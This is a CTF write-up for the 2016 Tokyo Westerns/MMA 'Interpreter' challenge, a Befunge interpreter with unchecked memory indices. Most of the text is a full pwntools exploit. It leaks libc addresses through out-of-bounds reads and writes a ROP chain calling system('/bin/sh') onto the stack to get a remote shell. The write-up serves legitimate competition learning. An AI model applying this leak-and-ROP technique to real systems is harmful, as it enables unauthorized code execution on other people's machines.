---
layout: post
redirect_from:
  - /writeup/ctf/2016/twctf-2016-interpreter/
  - /blog/2016/09/05/twctf-2016-interpreter/
date: "2016-09-05T12:58:30+09:00"
tags: [ "ctf", "writeup", "pwn", "mmactf", "twctf", "esolang", "befunge" ]
"target_url": [ "https://score.ctf.westerns.tokyo/problems/24" ]
---

# Tokyo Westerns/MMA CTF 2nd 2016: Interpreter

`befunge.7z`の文字列だけで脆弱性も攻撃方法も推測できてしまって楽勝って感じだったのに、bug埋めたのでflag出すのには手間取ってしまった。

## solution

The binary is an intepreter of ordinary [befunge](https://esolangs.org/wiki/Befunge).
The memory space is allocated as fixed length array and the indices is not checked.
So you can read/write anywhere using `g`/`p`.

## similar problems

-   brainfuck intepreter of <http://golf.shinh.org/>
    -   32bit, pwnable
-   brainfuck intepreter of <http://yukicoder.me/>
    -   64bit, unsolvable?

## implementation

<https://github.com/niklasb/libc-database> was useful to detect the version of libc.

``` sh
$ ./find __libc_start_main 0x7efe2f127e50 alarm 0x7efe2f1c6b90
ubuntu-trusty-amd64-libc6 (id libc6_2.19-0ubuntu6.9_amd64)
```

``` python
#!/usr/bin/env python2
import time
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='pwn1.chal.ctf.westerns.tokyo')
parser.add_argument('port', nargs='?', default=62839, type=int)
args = parser.parse_args()
context.log_level = 'debug'

libc_start_main_got = 0x201f70
alarm_got = 0x201f68
fixedpoint = 0x202008
program = 0x202040
stack = 0x202820
pop_rdi_ret = 0x120c
height = 25
width  = 80

## ubuntu-trusty-amd64-libc6
libc_start_main_ofs = 0x21e50
environ_ofs = 0x3c14a0
system_ofs = 0x46590
bin_sh_ofs = 0x17c8c3

## ubuntu-xenial-amd64-libc6
# libc_start_main_ofs = 0x20740
# environ_ofs = 0x3c5f98
# system_ofs = 0x45380
# bin_sh_ofs = 0x18c58b

def push(n):
    if n < 0:
        return '0' + push(- n) + '-'
    elif 0 <= n <= 9:
        return str(n)
    else:
        return push(n // 9) + '9*' + str(n % 9) + '+'

p = remote(args.host, args.port)

payloads = []
payloads += [ '> ~ v' ]
payloads += [ '^p01<' ]
payloads += [ '' ] * (height - len(payloads))
for payload in payloads:
    p.recvuntil('> ')
    p.sendline(payload)

def read(addr, base=0x0):
    p.send(push(addr - (base + program)))
    for i in range(8):
        p.send(':' + push(i) + '+0g,')
    p.send('$')
    time.sleep(1)
    return u64(p.recv(8))

def write(addr, s, base=0x0):
    p.send(push(addr - (base + program)))
    for i, c in enumerate(s):
        p.send(':' + push(i) + '+~' + c + '\\0p')
    p.send('$')

program_base = read(fixedpoint) - fixedpoint
log.info('program base: 0x%08x', program_base)

libc_start_main = read(libc_start_main_got)
log.info('__libc_start_main: 0x%08x', libc_start_main)
alarm = read(alarm_got)
log.info('alarm: 0x%08x', alarm)
libc_base = libc_start_main - libc_start_main_ofs
log.info('libc base: 0x%08x', libc_base)

environ = libc_base + environ_ofs
log.info('__environ: 0x%08x', environ)
environ_value = read(environ, base=program_base)
log.info('*__environ: 0x%08x', environ_value)

payload = ''
payload += p64(program_base + pop_rdi_ret)
payload += p64(libc_base + bin_sh_ofs)
payload += p64(libc_base + system_ofs)
write(environ_value - 240, payload, base=program_base)

p.send(' ' * 1000)

time.sleep(1)
p.sendline('id')
p.interactive()
```
